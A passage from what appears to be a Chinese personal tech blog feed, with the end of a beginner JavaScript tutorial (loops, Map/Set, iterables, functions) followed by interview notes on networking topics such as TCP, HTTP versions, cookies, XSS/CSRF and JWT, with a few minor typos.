<p>​    为了修补JavaScript这一严重设计缺陷，ECMA在后续规范中推出了strict模式，在strict模式下运行的JavaScript代码，强制通过<code>var</code>申明变量，未使用<code>var</code>申明变量就使用的，将导致运行错误。</p>
<p>​    启用strict模式的方法是在JavaScript代码的第一行写上：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h4 id="5-条件判断"><a href="#5-条件判断" class="headerlink" title="5. 条件判断"></a>5. 条件判断</h4><p>​    条件判断部分，Javascript使用的结构和C和Java一样。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (xxxx)&#123;</span><br><span class="line">	xxx;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (xxxx)&#123;</span><br><span class="line">	xxx;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	xxx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>嵌套和其他语言一样，不再赘述。</p>
<p>JavaScript把<code>null</code>、<code>undefined</code>、<code>0</code>、<code>NaN</code>和空字符串<code>&#39;&#39;</code>视为<code>false</code>，其他值一概视为<code>true</code>，因此上述代码条件判断的结果是<code>true</code>。</p>
<h4 id="6-循环"><a href="#6-循环" class="headerlink" title="6. 循环"></a>6. 循环</h4><p>​    Javascript有三种循环方式<code>for</code>，<code>while</code>，<code>do ... while</code>。</p>
<p>​    和C/C++很类似，但也有特殊点。</p>
<ol>
<li><p>for循环</p>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">0</span>;</span><br><span class="line">vaar i;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)&#123;</span><br><span class="line">	x = x + i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// for ... in ...用法</span></span><br><span class="line"><span class="comment">// 1.</span></span><br><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">    name: <span class="string">&#x27;Jack&#x27;</span>,</span><br><span class="line">    age: <span class="number">20</span>,</span><br><span class="line">    city: <span class="string">&#x27;Beijing&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> o) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(key); <span class="comment">// &#x27;name&#x27;, &#x27;age&#x27;, &#x27;city&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 过滤掉对象的继承属性</span></span><br><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">    name: <span class="string">&#x27;Jack&#x27;</span>,</span><br><span class="line">    age: <span class="number">20</span>,</span><br><span class="line">    city: <span class="string">&#x27;Beijing&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> o) &#123;</span><br><span class="line">    <span class="keyword">if</span> (o.hasOwnProperty(key)) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(key); <span class="comment">// &#x27;name&#x27;, &#x27;age&#x27;, &#x27;city&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. Array对象 -&gt; 类似python</span></span><br><span class="line"><span class="keyword">var</span> a = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> a) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i); <span class="comment">// &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;</span></span><br><span class="line">    <span class="built_in">console</span>.log(a[i]); <span class="comment">// &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<pre><code>2. while循环

while循环不需要这么麻烦。只需要括号里的条件为`false`，则退出循环。

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

3. do...while循环

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> n = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    n = n + <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (n &lt; <span class="number">100</span>);</span><br><span class="line"><span class="comment">// n -&gt; 100</span></span><br></pre></td></tr></table></figure>

需要注意的是，do ... while至少执行一次。
</code></pre>
<h4 id="7-Map-amp-Set-ES6"><a href="#7-Map-amp-Set-ES6" class="headerlink" title="7. Map &amp; Set (ES6)"></a>7. Map &amp; Set (ES6)</h4><p>​    <strong>1. Map</strong></p>
<p>​    <code>Map</code>是一组键值对的结构，具有极快的查找速度。</p>
<p>​    访问<code>Map</code>的方法也很简单，通过访问键得到值。</p>
<p>​    初始化<code>Map</code>需要一个二维数组，或者直接初始化一个空<code>Map</code>。<code>Map</code>具有以下方法：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> m = <span class="keyword">new</span> <span class="built_in">Map</span>(); <span class="comment">// 空Map</span></span><br><span class="line">m.set(<span class="string">&#x27;Adam&#x27;</span>, <span class="number">67</span>); <span class="comment">// 添加新的key-value</span></span><br><span class="line">m.set(<span class="string">&#x27;Bob&#x27;</span>, <span class="number">59</span>);</span><br><span class="line">m.has(<span class="string">&#x27;Adam&#x27;</span>); <span class="comment">// 是否存在key &#x27;Adam&#x27;: true</span></span><br><span class="line">m.get(<span class="string">&#x27;Adam&#x27;</span>); <span class="comment">// 67</span></span><br><span class="line">m.delete(<span class="string">&#x27;Adam&#x27;</span>); <span class="comment">// 删除key &#x27;Adam&#x27;</span></span><br><span class="line">m.get(<span class="string">&#x27;Adam&#x27;</span>); <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>

<p>​    由于一个key只能对应一个value，所以，多次对一个key放入value，后面的值会把前面的值冲掉：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> m = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">m.set(<span class="string">&#x27;Adam&#x27;</span>, <span class="number">67</span>);</span><br><span class="line">m.set(<span class="string">&#x27;Adam&#x27;</span>, <span class="number">88</span>);</span><br><span class="line">m.get(<span class="string">&#x27;Adam&#x27;</span>); <span class="comment">// 88</span></span><br></pre></td></tr></table></figure>

<p>​    相比起之前说到的对象，对象最大的劣势在于，键值对的键只能使用字符串，而Map的键不受影响。</p>
<p>​    <strong>2. Set</strong></p>
<p>​    <code>Set</code>和<code>Map</code>类似，也是一组key的集合，但不存储value。由于key不能重复。所以，在<code>Set</code>中，没有重复的key。</p>
<p>​    要创建一个<code>Set</code>，需要提供一个<code>Array</code>作为输入，或者直接创建一个空<code>Set</code>：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s1 = <span class="keyword">new</span> <span class="built_in">Set</span>(); <span class="comment">// 空Set</span></span><br><span class="line"><span class="keyword">var</span> s2 = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]); <span class="comment">// 含1, 2, 3</span></span><br></pre></td></tr></table></figure>

<p>​    重复元素在<code>Set</code>中自动被过滤：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="string">&#x27;3&#x27;</span>]);</span><br><span class="line">s; <span class="comment">// Set &#123;1, 2, 3, &quot;3&quot;&#125;</span></span><br></pre></td></tr></table></figure>

<p>​    通过<code>add(key)</code>方法可以添加元素到<code>Set</code>中，可以重复添加，但不会有效果：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">s.add(<span class="number">4</span>);</span><br><span class="line">s; <span class="comment">// Set &#123;1, 2, 3, 4&#125;</span></span><br><span class="line">s.add(<span class="number">4</span>);</span><br><span class="line">s; <span class="comment">// 仍然是 Set &#123;1, 2, 3, 4&#125;</span></span><br></pre></td></tr></table></figure>

<p>通过<code>delete(key)</code>方法可以删除元素：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]);</span><br><span class="line">s; <span class="comment">// Set &#123;1, 2, 3&#125;</span></span><br><span class="line">s.delete(<span class="number">3</span>);</span><br><span class="line">s; <span class="comment">// Set &#123;1, 2&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="8-Iterable-ES6"><a href="#8-Iterable-ES6" class="headerlink" title="8. Iterable(ES6)"></a>8. Iterable(ES6)</h4><p>​    遍历<code>Array</code>可以采用下标循环，遍历<code>Map</code>和<code>Set</code>就无法使用下标。为了统一集合类型，ES6标准引入了新的<code>iterable</code>类型，<code>Array</code>、<code>Map</code>和<code>Set</code>都属于<code>iterable</code>类型。</p>
<p>​    具有<code>iterable</code>类型的集合可以通过新的<code>for ... of</code>循环来遍历。</p>
<p>​    使用<code>for ... of</code>循环遍历集合，用法如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>];</span><br><span class="line"><span class="keyword">var</span> s = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>]);</span><br><span class="line"><span class="keyword">var</span> m = <span class="keyword">new</span> <span class="built_in">Map</span>([[<span class="number">1</span>, <span class="string">&#x27;x&#x27;</span>], [<span class="number">2</span>, <span class="string">&#x27;y&#x27;</span>], [<span class="number">3</span>, <span class="string">&#x27;z&#x27;</span>]]);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> x <span class="keyword">of</span> a) &#123; <span class="comment">// 遍历Array</span></span><br><span class="line">    <span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> x <span class="keyword">of</span> s) &#123; <span class="comment">// 遍历Set</span></span><br><span class="line">    <span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> x <span class="keyword">of</span> m) &#123; <span class="comment">// 遍历Map</span></span><br><span class="line">    <span class="built_in">console</span>.log(x[<span class="number">0</span>] + <span class="string">&#x27;=&#x27;</span> + x[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    此时我们抛出一个疑问，这么看来，for…in 和 for…of没有什么区别啊。</p>
<p>​    这个问题需要举个例子来说明</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>];</span><br><span class="line">a.name = <span class="string">&#x27;Hello&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> x <span class="keyword">in</span> a) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(x); <span class="comment">// &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;name&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// for ... in</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>];</span><br><span class="line">a.name = <span class="string">&#x27;Hello&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> x <span class="keyword">of</span> a) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(x); <span class="comment">// &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// for ... of</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// for ... in 遍历的实际上是对象的属性名称。一个Array数组实际上也是一个对象，它的每个元素的索引被视为一个属性。for ... in循环将把name包括在内，但Array的length属性却不包括在内。</span></span><br><span class="line"><span class="comment">// for ... of循环则完全修复了这些问题，它只循环集合本身的元素：</span></span><br></pre></td></tr></table></figure>

<p>然后我们要提一下<code>iterable</code>内置的<code>forEach</code>方法，它接收一个函数，每次迭代就自动回调该函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>];</span><br><span class="line">a.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">element, index, array</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// element: 指向当前元素的值</span></span><br><span class="line">    <span class="comment">// index: 指向当前索引</span></span><br><span class="line">    <span class="comment">// array: 指向Array对象本身</span></span><br><span class="line">    <span class="built_in">console</span>.log(element);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// Array</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> s = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>]);</span><br><span class="line">s.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">element, sameElement, set</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(element);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// Set</span></span><br><span class="line"><span class="comment">// Set与Array类似，但Set没有索引，因此回调函数的前两个参数都是元素本身</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> m = <span class="keyword">new</span> <span class="built_in">Map</span>([[<span class="number">1</span>, <span class="string">&#x27;x&#x27;</span>], [<span class="number">2</span>, <span class="string">&#x27;y&#x27;</span>], [<span class="number">3</span>, <span class="string">&#x27;z&#x27;</span>]]);</span><br><span class="line">m.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">value, key, map</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(value);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// Map</span></span><br><span class="line"><span class="comment">// Map的回调函数参数依次为value、key和map本身</span></span><br></pre></td></tr></table></figure>

<p>如果对某些参数不感兴趣，由于JavaScript的函数调用不要求参数必须一致，因此可以忽略它们。例如，只需要获得<code>Array</code>的<code>element</code>：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>];</span><br><span class="line">a.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">element</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(element);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="1-函数"><a href="#1-函数" class="headerlink" title="1. 函数"></a>1. 函数</h4><ol>
<li><p>函数定义</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">abs</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> -x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 第一种。如果没有return语句，函数执行完毕后也会返回结果，只是结果为undefined。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> abs = <span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> -x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 第二种。由于JavaScript的函数也是一个对象，上述定义的abs()函数实际上是一个函数对象，而函数名abs可以视为指向该函数的变量。</span></span><br><span class="line"><span class="comment">// 在这种方式下，function (x) &#123; ... &#125;是一个匿名函数，它没有函数名。但是，这个匿名函数赋值给了变量abs，所以，通过变量abs就可以调用该函数。</span></span><br></pre></td></tr></table></figure>

<p> 上述两种定义完全等价，注意第二种方式按照完整语法需要在函数体末尾加一个;，表示赋值语句结束。</p>
</li>
</ol>
<pre><code>2. 函数调用

调用函数时，按顺序传入参数即可。

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">abs(<span class="number">10</span>); <span class="comment">// return 10</span></span><br><span class="line">abs(-<span class="number">9</span>); <span class="comment">// return -9</span></span><br><span class="line"><span class="comment">// 调用函数时，按照顺序传入参数即可</span></span><br><span class="line"></span><br><span class="line">abs(<span class="number">10</span>, <span class="string">&#x27;blablabla&#x27;</span>); <span class="comment">// 返回10</span></span><br><span class="line">abs(-<span class="number">9</span>, <span class="string">&#x27;haha&#x27;</span>, <span class="string">&#x27;hehe&#x27;</span>, <span class="literal">null</span>); <span class="comment">// 返回9</span></span><br><span class="line"><span class="comment">//由于 JavaScript 允许传入任意个参数而不影响调用，因此传入的参数比定义的参数多也没有问题，虽然函数内部并不需要这些参数</span></span><br><span class="line"></span><br><span class="line">abs(); <span class="comment">// NaN</span></span><br><span class="line"><span class="comment">// 传入的参数比定义的少也没有问题。此时abs(x)函数的参数x收到的是 undefined , 计算结果是 NaN 。</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">abs</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> x !== <span class="string">&#x27;number&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="string">&#x27;Not a number&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (x &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> -x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果想避免接收到 undefined ，我们可以对参数进行过滤，抛出异常。</span></span><br></pre></td></tr></table></figure>

3. argument

   
</code></pre>
]]></content>
      <categories>
        <category>Js</category>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>Js</tag>
      </tags>
  </entry>
  <entry>
    <title>面试题目知识点总结</title>
    <url>/2021/07/28/%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>计算机网络<br>    1. GET 和 POST 的请求都能使用额外的参数，但是 GET 的参数是以查询字符串出现在URL 中，而 POST 的参数存储在实体主体中。<br>    GET用于获取资源 POST用于传输数据<br>    安全性而言各有利弊(get的不安全性在于参数在url中，post的不安全性在于其可以重复提交数据)</p>
<pre><code>2. cookie和session cookie保存在浏览器端,session保存在服务器端.
    Cookie一般用来保存用户信息, Session的主要作用就是通过服务端记录用户的状态.
    但是为了区分不同的客户端,服务器会生成sessionID发送并保存到cookie中.
    下次请求时会将sessionID一并发给server,所以session依赖cookie机制
禁用cookie? 将sessionID直接附加在URL后

cookie的不安全性?
    cookie欺骗 因为cookie是明文,只需要将这个cookie向服务器提交（模拟身份验证），身份验证通过之后，就可以冒充被窃取cookie对应用户来访问网站
    cookie截获 截获 重放攻击
如何解决?
    1.设置cookie有效期不要过长，合适即可
    2.设置HttpOnly属性为true,可以防止js脚本读取cookie信息，有效的防止XSS攻击。
    3.设置复杂的cookie，加密cookie
        （1）cookie的key使用uuid，随机生成；
        （2）cookie的value可以使用复杂组合，比如：用户名+当前时间+cookie有效时间+随机数。
        这样可以尽可能使得加密后的cookie更难解密，也是保护了cookie中的信息。
    4.用户第一次登录时，保存ip+cookie加密后的token
        每次请求，都去将当前cookie和ip组合起来加密后的token与保存的token作对比，只有完全对应才能验证成功。
    5.session和cookie同时使用
        sessionId虽然放在cookie中，但是相对的session更安全，可以将相对重要的信息存入session。
    6.如果网站支持https，尽可能使用https
        如果网站支持https，那么可以为cookie设置Secure属性为true，它的意思是，cookie只能使用https协议发送给服务器，而https比http更加安全。

3. https ssl两个协议(ssl记录协议(为高层封装,加密) ssl握手协议(用于传输前身份认证,协商加密算法等))

4. DNS 本地-&gt;根-&gt;顶级-&gt;权限 (递归 递归迭代)

5. 输入url后会发生什么
    浏览器向DNS服务器请求解析该URL中的域名所对应的IP地址
    解析出IP地址后，根据该IP地址和默认端口80，和服务器建立TCP连接
    浏览器发出读取文件的HTTP请求，该请求作为TCP三次握手的第三个报文的数据发送给服务端
    服务器对浏览器请求做出相应，并把对应的html文本发送给浏览器
    释放TCP连接(http1.0 和http1.1 长连接问题)
    浏览器渲染该html文本并显示内容

6. URI(统一资源标记符) URL(统一资源定位符)

7. 三次握手,四次挥手 以及理解(服务端客户端处于什么状态？为什么连接是三次,而断开是四次? 为什么等待2MSL? tips:服务端没收到ack)

8. TCP与UDP的区别
    tcp面向连接 udp面向无连接
    tcp提供可靠服务 udp尽最大努力交付
    tcp点对点 udp一对一 一对多 多对一 多对多
    tcp面向字节流 udp面向报文
    tcp开销大 udp开销小

9. tcp可靠传输如何保证?
    给每个包编号 校验和 流量控制 拥塞控制 ARQ(自动重传请求) 超时重传 

    TCP滑动窗口和流量控制
    TCP利用滑动窗口实现流量控制
    流量控制是为了控制发送方的发送速率,保证接收方来得及接收

    拥塞控制: 慢开始 拥塞避免 快重传 快恢复
    慢开始/拥塞避免: 有一个门限值ssthresh, 拥塞窗口cwnd=1开始,指数增大,到达门限值后,转为加法增大.发生网络拥塞时,门限值乘法减小,cwnd = 1开始继续慢开始
    快重传: 冗余ACK. 发方连续收到三个重复的ACK时,直接重传对方尚未收到的报文段,而不必等待那个报文段设置的重传计时器超时
    快恢复: 门限值设为cwnd的一半,cwnd设为当前的门限值,加法增大

10.Http状态码有五类：
    1** 信息性状态码，2** 成功状态码，3** 重定向，4** 客户端状态码，5** 服务端状态码
    常见的有 200请求成功 301资源被永久转移到其他url 404请求的资源不存在 500内部服务器错误 403 Forbidden拒绝访问

11. FTP: 20数据连接 21控制连接

12. TCP 传输控制协议(Transmisson Control Protocol)
    UDP 用户数据协议(User Datagram Protocol)
    IP  网际协议(Intert Protocol)

13. 互联网是由大量的异构（heterogeneous）网络通过路由器（router）相互连接起来的。互联网使用的网络层协议是无连接的网际协议（Intert Protocol）和许多路由选择协议，因此互联网的网络层也叫做网际层或IP层

14. TCP粘包 应用程序写入数据小于套接字缓冲区大小，网卡将应用多次写入的数据发送到网络上，这将会发生粘包。
            接收方法不及时读取套接字缓冲区数据，这将发生粘包

    TCP拆包 应用程序写入的数据大于套接字缓冲区大小，这将会发生拆包
            进行MSS（最大报文长度）大小的TCP分段，当TCP报文长度-TCP头部长度&gt;MSS的时候将发生拆包
    解决方法: 
        1. 使用带消息头的协议、消息头存储消息开始标识及消息长度信息，服务端获取消息头的时候解析出消息长度，然后向后读取该长度的内容。
        2. 设置定长消息，服务端每次读取既定长度的内容作为一条完整消息，当消息不够长时，空位补上固定字符。
        3. 设置消息边界，服务端从网络流中按消息编辑分离出消息内容，一般使用‘\n ’。
        4. 更为复杂的协议，例如楼主最近接触比较多的车联网协议 808,809 协议。

15. SYN = Synchronize 同步
    ACK = Acknowledge 确认

16. HTTP长连接,短链接是什么
    短链接: 每次发起的Http操作,都会建立一个tcp连接
    长连接: 会在响应头里添加代码Connection:keep-alive. 使用长连接的情况下,客户端与服务端的tcp连接不会关闭.客户端再次访问服务器时,会继续使用这个tcp连接.

TCP长连接和短链接
    长连接: 发送完数据后不断开连接(心跳包,维持连接)
    短链接: 发完数据后就断开连接

    长连接优点/缺点: 省去较多的tcp建立和断开操作/降低服务端性能,且需要管理所有tcp连接
    短连接优点/缺点: 对服务端来说管理方便/但是对于客户请求频繁,在tcp连接和关闭操作上浪费时间较多

17. https是否可以抓包？怎么分析包中内容呢？
    可以
    过程：随机数(RandomC, 非对称(RSA), 对称, Hash)

18. 如何理解http协议是无状态的?
    HTTP协议是无状态的，指的是协议对于事务处理没有记忆能力，服务器不知道客户端是什么状态。也就是说，打开一个服务器上的网页和上一次打开这个服务器上的网页之间没有任何联系。HTTP是一个无状态的面向连接的协议，无状态不代表HTTP不能保持TCP连接，更不能代表HTTP使用的是UDP协议（无连接）

19. xss和csrf的区别
    xss: 存储(提交的代码会存储在服务器端) 反射(XSS代码出现在url中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码) dom 向页面注入JS脚本
    csrf:利用cookie 访问
    区别: csrf需要cookie,xss不需要登录; csrf是利用网站a本身的漏洞,xss是向网站a注入js代码

TCP半连接状态
? 19. TCP通信中服务端处理客户端意外断开
    (1) 双方拟定心跳(自己编写心跳包)
        此时一般由客户端发送心跳包，服务端并不发送心跳包，只是定时轮询判断一下与上次的时间间隔是否超时
        出现三种情况
            a. 客户端由于某种网络延迟等原因很久以后才发送心跳包(此时斌没有断),这是服务器若利用自身设定的超时判断其已经断开，而后去关闭socket
            b. 客户端很久没有传心跳，确实是自身断了，再重启前服务端已经判断出其超时，并主动close，则四次挥手成功交互
            c. 客户端很久没传心跳，确实是自身断掉了，再重启前，服务端的轮询还未超时，再未主动close的时候该客户端已经重新连接。此时若服务端发送了FIN，则服务端处于CLOSE_WAIT；如没发FIN，则处于ESTABLISHED(问题?)

    (2) 启动TCP编程里的KeepAlive机制
        keepalive的原理就是TCP内嵌的一个心跳包
        exp: 如果当前服务器检测到超过一定时间没有数据传输,那么就会向客户端发送一个keep-alive包,此时客户端有三种状态:
            a. 客户端仍存在,网络良好. 返回ACK 服务端接到ACK 重置计时器
            b. 客户端异常关闭 客户端不会响应 
            c. 客户端曾崩溃,但已重启服务端会收到对其存活探测的响应.但是该响应是一个复位,从而引起服务器对连接的终止

JWT(Json Web Token) 用于作为JSON对象在各方之间安全地传输信息
    jwt由header、payload、signature组成
    JWT是一种用于双方之间传递安全信息的简洁的、URL安全的表述性声明规范。JWT作为一个开放的标准（RFC 7519），定义了一种简洁的，自包含的方法用于通信双方之间以Json对象的形式安全的传递信息。因为数字签名的存在，这些信息是可信的，JWT可以使用HMAC算法或者是RSA的公私秘钥对进行签名。

Http结构 请求行 请求头部 请求数据

HTTPS为什么安全?加密协议?TLS
    加密
    非对称 对称 Hash

网络编程中,三次握手发生在哪个api?
    服务端 bind() listen() accept()
    客户端 connect()
    python bind,connect,listen-&gt;null
            accep-&gt;tuple[socket,address]
    C里应该返回的是int,因为C中null = 0
    第一次握手：客户端向服务器端，客户端调用connect函数时
    第二次握手：服务器端向客户端，服务器端调用accept函数时
    第三次握手：客户端向服务器端，还是connect函数，之前connect一直阻塞着，等待回复

http 1.0 1.1 2.0 3.0的特点及其区别
    HTTP 1.0
        短连接：每次发送请求都要重新建立tcp请求，即三次握手，非常浪费性能
        无host头域，也就是http请求头里的host，
        不允许断点续传，而且不能只传输对象的一部分，要求传输整个对象
    HTTP 1.1
        长连接，流水线，使用connection:keep-alive使用长连接，也就是一次连接可以发送多个请求，客户端通知服务器返回本次请求结果后保持连接，当然也可以设置为close，（由于长连接会给服务器造成压力）HTTP 1.1还提供了与身份认证，断点续传
    HTTP2.0
        头部压缩，首部压缩（Header Compression）
        HTTP/1.1并不支持 HTTP 首部压缩，双方，各自维护一个header的索引表，使得不需要直接发送值，通过发送key缩减头部大小
        多路复用（多路复用允许同时通过单一的 HTTP/2 连接发起多重的请求-响应消息。在 HTTP/1.1 协议中浏览器客户端在同一时间，针对同一域名下的请求有一定数量限制。超过限制数目的请求会被阻塞。这也是为何一些站点会有多个静态资源 CDN 域名的原因之一）
        二进制分帧
        HTTP/2在 应用层(HTTP/2)和传输层(TCP or UDP)之间增加一个二进制分帧层，在二进制分帧层中， HTTP/2 会将所有传输的信息分割为更小的消息和帧（frame）,并对它们采用二进制格式的编码
    HTTP 3.0
        基于google的QUIC协议，（Quick UDP Internet Connections)基于UDP的传输层协议，提供像TCP一样的可靠性，而quic协议是使用udp实现的，可以选择在应用层使用HTTP2.0实现多路传输，在物理层使用CDN解决网络拥塞和最后一公里问题
        CDN的全称是Content Delivery Network，即内容分发网络。其基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定，CDN的关键技术主要有内容存储和分发技术减少了tcp三次握手时间，以及tls握手时间

现在有一个高并发的场景，连接数为50万，此时客户端突然断电down掉了，服务端怎么快速回收socket？
    遍历 设置一个timer
</code></pre>
